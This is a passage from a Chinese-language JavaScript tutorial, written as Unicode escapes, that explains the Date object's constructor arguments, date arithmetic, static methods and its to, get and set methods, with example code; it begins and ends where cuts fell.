\u7b2c\u4e09\uff0c\u53c2\u6570\u4e3a\u5e74\u3001\u6708\u3001\u65e5\u7b49\u591a\u4e2a\u6574\u6570\u65f6\uff0c\u5e74\u548c\u6708\u662f\u4e0d\u80fd\u7701\u7565\u7684\uff0c\u5176\u4ed6\u53c2\u6570\u90fd\u53ef\u4ee5\u7701\u7565\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u65f6\u81f3\u5c11\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u56e0\u4e3a\u5982\u679c\u53ea\u4f7f\u7528\u201c\u5e74\u201d\u8fd9\u4e00\u4e2a\u53c2\u6570\uff0c Date \u4f1a\u5c06\u5176\u89e3\u91ca\u4e3a\u6beb\u79d2\u6570\u3002 1 2 new Date ( 2013 ) // Thu Jan 01 1970 08:00:02 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c2013\u88ab\u89e3\u91ca\u4e3a\u6beb\u79d2\u6570\uff0c\u800c\u4e0d\u662f\u5e74\u4efd\u3002 1 2 3 4 5 6 7 8 new Date ( 2013 , 0 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , 1 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , 1 , 0 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , 1 , 0 , 0 , 0 , 0 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1\u6709\u51e0\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u7684\u90fd\u662f2013\u5e741\u67081\u65e5\u96f6\u70b9\u3002 \u6700\u540e\uff0c\u5404\u4e2a\u53c2\u6570\u7684\u53d6\u503c\u8303\u56f4\u5982\u4e0b\u3002 \u5e74\uff1a\u4f7f\u7528\u56db\u4f4d\u6570\u5e74\u4efd\uff0c\u6bd4\u5982 2000 \u3002\u5982\u679c\u5199\u6210\u4e24\u4f4d\u6570\u6216\u4e2a\u4f4d\u6570\uff0c\u5219\u52a0\u4e0a 1900 \uff0c\u5373 10 \u4ee3\u88681910\u5e74\u3002\u5982\u679c\u662f\u8d1f\u6570\uff0c\u8868\u793a\u516c\u5143\u524d\u3002 \u6708\uff1a 0 \u8868\u793a\u4e00\u6708\uff0c\u4f9d\u6b21\u7c7b\u63a8\uff0c 11 \u8868\u793a12\u6708\u3002 \u65e5\uff1a 1 \u5230 31 \u3002 \u5c0f\u65f6\uff1a 0 \u5230 23 \u3002 \u5206\u949f\uff1a 0 \u5230 59 \u3002 \u79d2\uff1a 0 \u5230 59 \u6beb\u79d2\uff1a 0 \u5230 999 \u3002 \u6ce8\u610f\uff0c\u6708\u4efd\u4ece 0 \u5f00\u59cb\u8ba1\u7b97\uff0c\u4f46\u662f\uff0c\u5929\u6570\u4ece 1 \u5f00\u59cb\u8ba1\u7b97\u3002\u53e6\u5916\uff0c\u9664\u4e86\u65e5\u671f\u7684\u9ed8\u8ba4\u503c\u4e3a 1 \uff0c\u5c0f\u65f6\u3001\u5206\u949f\u3001\u79d2\u949f\u548c\u6beb\u79d2\u7684\u9ed8\u8ba4\u503c\u90fd\u662f 0 \u3002 \u8fd9\u4e9b\u53c2\u6570\u5982\u679c\u8d85\u51fa\u4e86\u6b63\u5e38\u8303\u56f4\uff0c\u4f1a\u88ab\u81ea\u52a8\u6298\u7b97\u3002\u6bd4\u5982\uff0c\u5982\u679c\u6708\u8bbe\u4e3a 15 \uff0c\u5c31\u6298\u7b97\u4e3a\u4e0b\u4e00\u5e74\u76844\u6708\u3002 1 2 3 4 new Date ( 2013 , 15 ) // Tue Apr 01 2014 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , 0 ) // Mon Dec 31 2012 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\uff0c\u65e5\u671f\u8bbe\u4e3a 0 \uff0c\u5c31\u4ee3\u8868\u4e0a\u4e2a\u6708\u7684\u6700\u540e\u4e00\u5929\u3002 \u53c2\u6570\u8fd8\u53ef\u4ee5\u4f7f\u7528\u8d1f\u6570\uff0c\u8868\u793a\u6263\u53bb\u7684\u65f6\u95f4\u3002 1 2 3 4 new Date ( 2013 , - 1 ) // Sat Dec 01 2012 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , - 1 ) // Sun Dec 30 2012 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5206\u522b\u5bf9\u6708\u548c\u65e5\u4f7f\u7528\u4e86\u8d1f\u6570\uff0c\u8868\u793a\u4ece\u57fa\u51c6\u65e5\u6263\u53bb\u76f8\u5e94\u7684\u65f6\u95f4\u3002 \u65e5\u671f\u7684\u8fd0\u7b97 \u00b6 \u7c7b\u578b\u81ea\u52a8\u8f6c\u6362\u65f6\uff0c Date \u5b9e\u4f8b\u5982\u679c\u8f6c\u4e3a\u6570\u503c\uff0c\u5219\u7b49\u4e8e\u5bf9\u5e94\u7684\u6beb\u79d2\u6570\uff1b\u5982\u679c\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u5219\u7b49\u4e8e\u5bf9\u5e94\u7684\u65e5\u671f\u5b57\u7b26\u4e32\u3002\u6240\u4ee5\uff0c\u4e24\u4e2a\u65e5\u671f\u5b9e\u4f8b\u5bf9\u8c61\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u5b83\u4eec\u95f4\u9694\u7684\u6beb\u79d2\u6570\uff1b\u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u4e24\u4e2a\u5b57\u7b26\u4e32\u8fde\u63a5\u800c\u6210\u7684\u65b0\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 var d1 = new Date ( 2000 , 2 , 1 ); var d2 = new Date ( 2000 , 3 , 1 ); d2 - d1 // 2678400000 d2 + d1 // \"Sat Apr 01 2000 00:00:00 GMT+0800 (CST)Wed Mar 01 2000 00:00:00 GMT+0800 (CST)\" \u9759\u6001\u65b9\u6cd5 \u00b6 Date.now() \u00b6 Date.now \u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u8ddd\u79bb\u65f6\u95f4\u96f6\u70b9\uff081970\u5e741\u67081\u65e5 00:00:00 UTC\uff09\u7684\u6beb\u79d2\u6570\uff0c\u76f8\u5f53\u4e8e Unix \u65f6\u95f4\u6233\u4e58\u4ee51000\u3002 1 Date . now () // 1364026285194 Date.parse() \u00b6 Date.parse \u65b9\u6cd5\u7528\u6765\u89e3\u6790\u65e5\u671f\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u8be5\u65f6\u95f4\u8ddd\u79bb\u65f6\u95f4\u96f6\u70b9\uff081970\u5e741\u67081\u65e5 00:00:00\uff09\u7684\u6beb\u79d2\u6570\u3002 \u65e5\u671f\u5b57\u7b26\u4e32\u5e94\u8be5\u7b26\u5408 RFC 2822 \u548c ISO 8061 \u8fd9\u4e24\u4e2a\u6807\u51c6\uff0c\u5373 YYYY-MM-DDTHH:mm:ss.sssZ \u683c\u5f0f\uff0c\u5176\u4e2d\u6700\u540e\u7684 Z \u8868\u793a\u65f6\u533a\u3002\u4f46\u662f\uff0c\u5176\u4ed6\u683c\u5f0f\u4e5f\u53ef\u4ee5\u88ab\u89e3\u6790\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 Date . parse ( 'Aug 9, 1995' ) Date . parse ( 'January 26, 2011 13:51:50' ) Date . parse ( 'Mon, 25 Dec 1995 13:30:00 GMT' ) Date . parse ( 'Mon, 25 Dec 1995 13:30:00 +0430' ) Date . parse ( '2011-10-10' ) Date . parse ( '2011-10-10T14:48:00' ) \u4e0a\u9762\u7684\u65e5\u671f\u5b57\u7b26\u4e32\u90fd\u53ef\u4ee5\u89e3\u6790\u3002 \u5982\u679c\u89e3\u6790\u5931\u8d25\uff0c\u8fd4\u56de NaN \u3002 1 Date . parse ( 'xxx' ) // NaN Date.UTC() \u00b6 Date.UTC \u65b9\u6cd5\u63a5\u53d7\u5e74\u3001\u6708\u3001\u65e5\u7b49\u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u8be5\u65f6\u95f4\u8ddd\u79bb\u65f6\u95f4\u96f6\u70b9\uff081970\u5e741\u67081\u65e5 00:00:00 UTC\uff09\u7684\u6beb\u79d2\u6570\u3002 1 2 3 4 5 6 // \u683c\u5f0f Date . UTC ( year , month [, date [, hrs [, min [, sec [, ms ]]]]]) // \u7528\u6cd5 Date . UTC ( 2011 , 0 , 1 , 2 , 3 , 4 , 567 ) // 1293847384567 \u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u7528\u6cd5\u4e0e Date \u6784\u9020\u51fd\u6570\u5b8c\u5168\u4e00\u81f4\uff0c\u6bd4\u5982\u6708\u4ece 0 \u5f00\u59cb\u8ba1\u7b97\uff0c\u65e5\u671f\u4ece 1 \u5f00\u59cb\u8ba1\u7b97\u3002\u533a\u522b\u5728\u4e8e Date.UTC \u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u4f1a\u88ab\u89e3\u91ca\u4e3a UTC \u65f6\u95f4\uff08\u4e16\u754c\u6807\u51c6\u65f6\u95f4\uff09\uff0c Date \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab\u89e3\u91ca\u4e3a\u5f53\u524d\u65f6\u533a\u7684\u65f6\u95f4\u3002 \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 Date \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6709\u51e0\u5341\u4e2a\u81ea\u5df1\u7684\u65b9\u6cd5\uff0c\u9664\u4e86 valueOf \u548c toString \uff0c\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b\u3002 to \u7c7b\uff1a\u4ece Date \u5bf9\u8c61\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6307\u5b9a\u7684\u65f6\u95f4\u3002 get \u7c7b\uff1a\u83b7\u53d6 Date \u5bf9\u8c61\u7684\u65e5\u671f\u548c\u65f6\u95f4\u3002 set \u7c7b\uff1a\u8bbe\u7f6e Date \u5bf9\u8c61\u7684\u65e5\u671f\u548c\u65f6\u95f4\u3002 Date.prototype.valueOf() \u00b6 valueOf \u65b9\u6cd5\u8fd4\u56de\u5b9e\u4f8b\u5bf9\u8c61\u8ddd\u79bb\u65f6\u95f4\u96f6\u70b9\uff081970\u5e741\u67081\u65e500:00:00 UTC\uff09\u5bf9\u5e94\u7684\u6beb\u79d2\u6570\uff0c\u8be5\u65b9\u6cd5\u7b49\u540c\u4e8e getTime \u65b9\u6cd5\u3002 1 2 3 4 var d = new Date (); d . valueOf () // 1362790014817 d . getTime () // 1362790014817 \u9884\u671f\u4e3a\u6570\u503c\u7684\u573a\u5408\uff0c Date \u5b9e\u4f8b\u4f1a\u81ea\u52a8\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8ba1\u7b97\u65f6\u95f4\u7684\u95f4\u9694\u3002 1 2 3 4 var start = new Date (); // ... var end = new Date (); var elapsed = end - start ; to \u7c7b\u65b9\u6cd5 \u00b6 \uff081\uff09Date.prototype.toString() toString \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b8c\u6574\u7684\u65e5\u671f\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 var d = new Date ( 2013 , 0 , 1 ); d . toString () // \"Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\" d // \"Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\" \u56e0\u4e3a toString \u662f\u9ed8\u8ba4\u7684\u8c03\u7528\u65b9\u6cd5\uff0c\u6240\u4ee5\u5982\u679c\u76f4\u63a5\u8bfb\u53d6 Date \u5b9e\u4f8b\uff0c\u5c31\u76f8\u5f53\u4e8e\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 \uff082\uff09Date.prototype.toUTCString() toUTCString \u65b9\u6cd5\u8fd4\u56de\u5bf9\u5e94\u7684 UTC \u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u6bd4\u5317\u4eac\u65f6\u95f4\u665a8\u4e2a\u5c0f\u65f6\u3002 1 2 3 4 var d = new Date ( 2013 , 0 , 1 ); d . toUTCString () // \"Mon, 31 Dec 2012 16:00:00 GMT\" \uff083\uff09Date.prototype.toISOString() toISOString \u65b9\u6cd5\u8fd4\u56de\u5bf9\u5e94\u65f6\u95f4\u7684 ISO8601 \u5199\u6cd5\u3002 1 2 3 4 var d = new Date ( 2013 , 0 , 1 ); d . toISOString () // \"2012-12-31T16:00:00.000Z\" \u6ce8\u610f\uff0c toISOString \u65b9\u6cd5\u8fd4\u56de\u7684\u603b\u662f UTC \u65f6\u533a\u7684\u65f6\u95f4\u3002 \uff084\uff09Date.prototype.toJSON() toJSON \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7b26\u5408 JSON \u683c\u5f0f\u7684 ISO \u65e5\u671f\u5b57\u7b26\u4e32\uff0c\u4e0e toISOString \u65b9\u6cd5\u7684\u8fd4\u56de\u7ed3\u679c\u5b8c\u5168\u76f8\u540c\u3002 1 2 3 4 var d = new Date ( 2013 , 0 , 1 ); d . toJSON () // \"2012-12-31T16:00:00.000Z\" \uff085\uff09Date.prototype.toDateString() toDateString \u65b9\u6cd5\u8fd4\u56de\u65e5\u671f\u5b57\u7b26\u4e32\uff08\u4e0d\u542b\u5c0f\u65f6\u3001\u5206\u548c\u79d2\uff09\u3002 1 2 var d = new Date ( 2013 , 0 , 1 ); d . toDateString () // \"Tue Jan 01 2013\" \uff086\uff09Date.prototype.toTimeString() toTimeString \u65b9\u6cd5\u8fd4\u56de\u65f6\u95f4\u5b57\u7b26\u4e32\uff08\u4e0d\u542b\u5e74\u6708\u65e5\uff09\u3002 1 2 var d = new Date ( 2013 , 0 , 1 ); d . toTimeString () // \"00:00:00 GMT+0800 (CST)\" \uff087\uff09\u672c\u5730\u65f6\u95f4 \u4ee5\u4e0b\u4e09\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06 Date \u5b9e\u4f8b\u8f6c\u4e3a\u8868\u793a\u672c\u5730\u65f6\u95f4\u7684\u5b57\u7b26\u4e32\u3002 Date.prototype.toLocaleString() \uff1a\u5b8c\u6574\u7684\u672c\u5730\u65f6\u95f4\u3002 Date.prototype.toLocaleDateString() \uff1a\u672c\u5730\u65e5\u671f\uff08\u4e0d\u542b\u5c0f\u65f6\u3001\u5206\u548c\u79d2\uff09\u3002 Date.prototype.toLocaleTimeString() \uff1a\u672c\u5730\u65f6\u95f4\uff08\u4e0d\u542b\u5e74\u6708\u65e5\uff09\u3002 \u4e0b\u9762\u662f\u7528\u6cd5\u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var d = new Date ( 2013 , 0 , 1 ); d . toLocaleString () // \u4e2d\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"2013\u5e741\u67081\u65e5 \u4e0a\u534812:00:00\" // \u82f1\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"1/1/2013 12:00:00 AM\" d . toLocaleDateString () // \u4e2d\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"2013\u5e741\u67081\u65e5\" // \u82f1\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"1/1/2013\" d . toLocaleTimeString () // \u4e2d\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"\u4e0a\u534812:00:00\" // \u82f1\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"12:00:00 AM\" \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u6709\u4e24\u4e2a\u53ef\u9009\u7684\u53c2\u6570\u3002 1 2 3 dateObj . toLocaleString ([ locales [, options ]]) dateObj . toLocaleDateString ([ locales [, options ]]) dateObj . toLocaleTimeString ([ locales [, options ]]) \u8fd9\u4e24\u4e2a\u53c2\u6570\u4e2d\uff0c locales \u662f\u4e00\u4e2a\u6307\u5b9a\u6240\u7528\u8bed\u8a00\u7684\u5b57\u7b26\u4e32\uff0c options \u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u3002\u4e0b\u9762\u662f locales \u7684\u4f8b\u5b50\uff0c\u5206\u522b\u91c7\u7528 en-US \u548c zh-CN \u8bed\u8a00\u8bbe\u5b9a\u3002 1 2 3 4 5 6 7 8 9 10 var d = new Date ( 2013 , 0 , 1 ); d . toLocaleString ( 'en-US' ) // \"1/1/2013, 12:00:00 AM\" d . toLocaleString ( 'zh-CN' ) // \"2013/1/1 \u4e0a\u534812:00:00\" d . toLocaleDateString ( 'en-US' ) // \"1/1/2013\" d . toLocaleDateString ( 'zh-CN' ) // \"2013/1/1\" d . toLocaleTimeString ( 'en-US' ) // \"12:00:00 AM\" d . toLocaleTimeString ( 'zh-CN' ) // \"\u4e0a\u534812:00:00\" options \u914d\u7f6e\u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 dateStyle \uff1a\u53ef\u80fd\u7684\u503c\u4e3a full \u3001 long \u3001 medium \u3001 short \u3002 timeStyle \uff1a\u53ef\u80fd\u7684\u503c\u4e3a full \u3001 long \u3001 medium \u3001 short \u3002 month \uff1a\u53ef\u80fd\u7684\u503c\u4e3a numeric \u3001 2-digit \u3001 long \u3001 short \u3001 narrow \u3002 year \uff1a\u53ef\u80fd\u7684\u503c\u4e3a numeric \u3001 2-digit \u3002 weekday \uff1a\u53ef\u80fd\u7684\u503c\u4e3a long \u3001 short \u3001 narrow \u3002 day \u3001 hour \u3001 minute \u3001 second \uff1a\u53ef\u80fd\u7684\u503c\u4e3a numeric \u3001 2-digit \u3002 timeZone \uff1a\u53ef\u80fd\u7684\u503c\u4e3a IANA \u7684\u65f6\u533a\u6570\u636e\u5e93\u3002 timeZooneName \uff1a\u53ef\u80fd\u7684\u503c\u4e3a long \u3001 short \u3002 hour12 \uff1a24\u5c0f\u65f6\u5468\u671f\u8fd8\u662f12\u5c0f\u65f6\u5468\u671f\uff0c\u53ef\u80fd\u7684\u503c\u4e3a true \u3001 false \u3002 \u4e0b\u9762\u662f\u7528\u6cd5\u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var d = new Date ( 2013 , 0 , 1 ); d . toLocaleDateString ( 'en-US' , { weekday : 'long' , year : 'numeric' , month : 'long' , day : 'numeric' }) // \"Tuesday, January 1, 2013\" d . toLocaleDateString ( 'en-US' , { day : \"2-digit\" , month : \"long\" , year : \"2-digit\" }); // \"January 01, 13\" d . toLocaleTimeString ( 'en-US' , { timeZone : 'UTC' , timeZoneName : 'short' }) // \"4:00:00 PM UTC\" d . toLocaleTimeString ( 'en-US' , { timeZone : 'Asia/Shanghai' , timeZoneName : 'long' }) // \"12:00:00 AM China Standard Time\" d . toLocaleTimeString ( 'en-US' , { hour12 : false }) // \"00:00:00\" d . toLocaleTimeString ( 'en-US' , { hour12 : true }) // \"12:00:00 AM\" get \u7c7b\u65b9\u6cd5 \u00b6 Date \u5bf9\u8c61\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217 get* \u65b9\u6cd5\uff0c\u7528\u6765\u83b7\u53d6\u5b9e\u4f8b\u5bf9\u8c61\u67d0\u4e2a\u65b9\u9762\u7684\u503c\u3002 getTime() \uff1a\u8fd4\u56de\u5b9e\u4f8b\u8ddd\u79bb1970\u5e741\u67081\u65e500:00:00\u7684\u6beb\u79d2\u6570\uff0c\u7b49\u540c\u4e8e valueOf \u65b9\u6cd5\u3002 getDate() \uff1a\u8fd4\u56de\u5b9e\u4f8b\u5bf9\u8c61\u5bf9\u5e94\u6bcf\u4e2a\u6708\u7684\u51e0\u53f7\uff08\u4ece1\u5f00\u59cb\uff09\u3002 getDay() \uff1a\u8fd4\u56de\u661f\u671f\u51e0\uff0c\u661f\u671f\u65e5\u4e3a0\uff0c\u661f\u671f\u4e00\u4e3a1\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 getFullYear() \uff1a\u8fd4\u56de\u56db\u4f4d\u7684\u5e74\u4efd\u3002 getMonth() \uff1a\u8fd4\u56de\u6708\u4efd\uff080\u8868\u793a1\u6708\uff0c11\u8868\u793a12\u6708\uff09\u3002 getHours() \uff1a\u8fd4\u56de\u5c0f\u65f6\uff080-23\uff09\u3002 getMilliseconds() \uff1a\u8fd4\u56de\u6beb\u79d2\uff080-999\uff09\u3002 getMinutes() \uff1a\u8fd4\u56de\u5206\u949f\uff080-59\uff09\u3002 getSeconds() \uff1a\u8fd4\u56de\u79d2\uff080-59\uff09\u3002 getTimezoneOffset() \uff1a\u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u4e0e UTC \u7684\u65f6\u533a\u5dee\u5f02\uff0c\u4ee5\u5206\u949f\u8868\u793a\uff0c\u8fd4\u56de\u7ed3\u679c\u8003\u8651\u5230\u4e86\u590f\u4ee4\u65f6\u56e0\u7d20\u3002 \u6240\u6709\u8fd9\u4e9b get* \u65b9\u6cd5\u8fd4\u56de\u7684\u90fd\u662f\u6574\u6570\uff0c\u4e0d\u540c\u65b9\u6cd5\u8fd4\u56de\u503c\u7684\u8303\u56f4\u4e0d\u4e00\u6837\u3002 \u5206\u949f\u548c\u79d2\uff1a0 \u5230 59 \u5c0f\u65f6\uff1a0 \u5230 23 \u661f\u671f\uff1a0\uff08\u661f\u671f\u5929\uff09\u5230 6\uff08\u661f\u671f\u516d\uff09 \u65e5\u671f\uff1a1 \u5230 31 \u6708\u4efd\uff1a0\uff08\u4e00\u6708\uff09\u5230 11\uff08\u5341\u4e8c\u6708\uff09 1 2 3 4 5 6 var d = new Date ( 'January 6, 2013' ); d . getDate () // 6 d . getMonth () // 0 d . getFullYear () // 2013 d . getTimezoneOffset () // -480 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u540e\u4e00\u884c\u8fd4\u56de -480 \uff0c\u5373 UTC \u65f6\u95f4\u51cf\u53bb\u5f53\u524d\u65f6\u95f4\uff0c\u5355\u4f4d\u662f\u5206\u949f\u3002 -480 \u8868\u793a UTC \u6bd4\u5f53\u524d\u65f6\u95f4\u5c11480\u5206\u949f\uff0c\u5373\u5f53\u524d\u65f6\u533a\u6bd4 UTC \u65e98\u4e2a\u5c0f\u65f6\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u8ba1\u7b97\u672c\u5e74\u5ea6\u8fd8\u5269\u4e0b\u591a\u5c11\u5929\u3002 1 2 3 4 5 6 function leftDays () { var today = new Date (); var endYear = new Date ( today . getFullYear (), 11 , 31 , 23 , 59 , 59 , 999 ); var msPerDay = 24 * 60 * 60 * 1000 ; return Math . round (( endYear . getTime () - today . getTime ()) / msPerDay ); } \u4e0a\u9762\u8fd9\u4e9b get* \u65b9\u6cd5\u8fd4\u56de\u7684\u90fd\u662f\u5f53\u524d\u65f6\u533a\u7684\u65f6\u95f4\uff0c Date \u5bf9\u8c61\u8fd8\u63d0\u4f9b\u4e86\u8fd9\u4e9b\u65b9\u6cd5\u5bf9\u5e94\u7684 UTC \u7248\u672c\uff0c\u7528\u6765\u8fd4\u56de UTC \u65f6\u95f4\u3002 getUTCDate() getUTCFullYear() getUTCMonth() getUTCDay() getUTCHours() getUTCMinutes() getUTCSeconds() getUTCMilliseconds() 1 2 3 4 var d = new Date ( 'January 6, 2013' ); d . getDate () // 6 d . getUTCDate () // 5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 d \u8868\u793a\u5f53\u524d\u65f6\u533a\uff08\u4e1c\u516b\u65f6\u533a\uff09\u76841\u67086\u65e50\u70b90\u52060\u79d2\uff0c\u8fd9\u4e2a\u65f6\u95f4\u5bf9\u4e8e\u5f53\u524d\u65f6\u533a\u6765\u8bf4\u662f1\u67086\u65e5\uff0c\u6240\u4ee5 getDate \u65b9\u6cd5\u8fd4\u56de6\uff0c\u5bf9\u4e8e UTC \u65f6\u533a\u6765\u8bf4\u662f1\u67085\u65e5\uff0c\u6240\u4ee5 getUTCDate \u65b9\u6cd5\u8fd4\u56de5\u3002 set \u7c7b\u65b9\u6cd5 \u00b6 Date \u5bf9\u8c61\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217 set* \u65b9\u6cd5\uff0c\u7528\u6765\u8bbe\u7f6e\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5404\u4e2a\u65b9\u9762\u3002 setDate(date) \uff1a\u8bbe\u7f6e\u5b9e\u4f8b\u5bf9\u8c61\u5bf9\u5e94\u7684\u6bcf\u4e2a\u6708\u7684\u51e0\u53f7\uff081-31\uff09\uff0c\u8fd4\u56de\u6539\u53d8\u540e\u6beb\u79d2\u65f6\u95f4\u6233\u3002 setFullYear(year [, month, date]) \uff1a\u8bbe\u7f6e\u56db\u4f4d\u5e74\u4efd\u3002 setHours(hour [, min, sec, ms]) \uff1a\u8bbe\u7f6e\u5c0f\u65f6\uff080-23\uff09\u3002 setMilliseconds() \uff1a\u8bbe\u7f6e\u6beb\u79d2\uff080-999\uff09\u3002 setMinutes(min [, sec, ms]) \uff1a\u8bbe\u7f6e\u5206\u949f\uff080-59\uff09\u3002 setMonth(month [, date]) \uff1a\u8bbe\u7f6e\u6708\u4efd\uff080-11\uff09\u3002 setSeconds(sec [, ms]) \uff1a\u8bbe\u7f6e\u79d2\uff080-59\uff09\u3002 setTime(milliseconds) \uff1a\u8bbe\u7f6e\u6beb\u79d2\u65f6\u95f4\u6233\u3002 \u8fd9\u4e9b\u65b9\u6cd5\u57fa\u672c\u662f\u8ddf get* \u65b9\u6cd5\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u4f46\u662f\u6ca1\u6709 setDay \u65b9\u6cd5\uff0c\u56e0\u4e3a\u661f\u671f\u51e0\u662f\u8ba1\u7b97\u51fa\u6765\u7684\uff0c\u800c\u4e0d\u662f\u8bbe\u7f6e\u7684\u3002\u53e6\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51e1\u662f\u6d89\u53ca\u5230\u8bbe\u7f6e\u6708\u4efd\uff0c\u90fd\u662f\u4ece0\u5f00\u59cb\u7b97\u7684\uff0c\u5373 0 \u662f1\u6708\uff0c 11 \u662f12\u6708\u3002 1 2 3 4 5 var d = new Date ( 'January 6, 2013' ); d // Sun Jan 06 2013 00:00:00 GMT+0800 (CST) d . setDate ( 9 ) // 1357660800000 d // Wed Jan 09 2013 00:00:00 GMT+0800 (CST) set* \u65b9\u6cd5\u7684\u53c2\u6570\u90fd\u4f1a\u81ea\u52a8\u6298\u7b97\u3002\u4ee5 setDate() \u4e3a\u4f8b\uff0c\u5982\u679c\u53c2\u6570\u8d85\u8fc7\u5f53\u6708\u7684\u6700\u5927\u5929\u6570\uff0c\u5219\u5411\u4e0b\u4e00\u4e2a\u6708\u987a\u5ef6\uff0c\u5982\u679c\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u8868\u793a\u4ece\u4e0a\u4e2a\u6708\u7684\u6700\u540e\u4e00\u5929\u5f00\u59cb\u51cf\u53bb\u7684\u5929\u6570\u3002 1 2 3 4 5 6 7 8 9 var d1 = new Date ( 'January 6, 2013' ); d1 . setDate ( 32 ) // 1359648000000 d1 // Fri Feb 01 2013 00:00:00 GMT+0800 (CST) var d2 = new Date ( 'January 6, 2013' ); d2 . setDate ( - 1 ) // 1356796800000 d2 // Sun Dec 30 2012 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c d1.setDate(32) \u5c06\u65e5\u671f\u8bbe\u4e3a1\u6708\u4efd\u768432\u53f7\uff0c\u56e0\u4e3a1\u6708\u4efd\u53ea\u670931\u53f7\uff0c\u6240\u4ee5\u81ea\u52a8\u6298\u7b97\u4e3a2\u67081\u65e5\u3002 d2.setDate(-1) \u8868\u793a\u8bbe\u4e3a\u4e0a\u4e2a\u6708\u7684\u5012\u6570\u7b2c\u4e8c\u5929\uff0c\u537312\u670830\u65e5\u3002 set \u7c7b\u65b9\u6cd5\u548c get \u7c7b\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7ed3\u5408\u4f7f\u7528\uff0c\u5f97\u5230\u76f8\u5bf9\u65f6\u95f4\u3002 1 2 3 4 5 6 7 8 var d = new Date (); // \u5c06\u65e5\u671f\u5411\u540e\u63a81000\u5929 d . setDate ( d . getDate () + 1000 ); // \u5c06\u65f6\u95f4\u8bbe\u4e3a6\u5c0f\u65f6\u540e d . setHours ( d . getHours () + 6 ); // \u5c06\u5e74\u4efd\u8bbe\u4e3a\u53bb\u5e74 d . setFullYear ( d . getFullYear () - 1 ); set* \u7cfb\u5217\u65b9\u6cd5\u9664\u4e86 setTime() \uff0c\u90fd\u6709\u5bf9\u5e94\u7684 UTC \u7248\u672c\uff0c\u5373\u8bbe\u7f6e UTC \u65f6\u533a\u7684\u65f6\u95f4\u3002 setUTCDate() setUTCFullYear() setUTCHours() setUTCMilliseconds() setUTCMinutes() setUTCMonth() setUTCSeconds() 1 2 3 4 var d = new Date ( 'January 6, 2013' ); d . getUTCHours () // 16 d . setUTCHours ( 22 ) // 1357423200000 d // Sun Jan 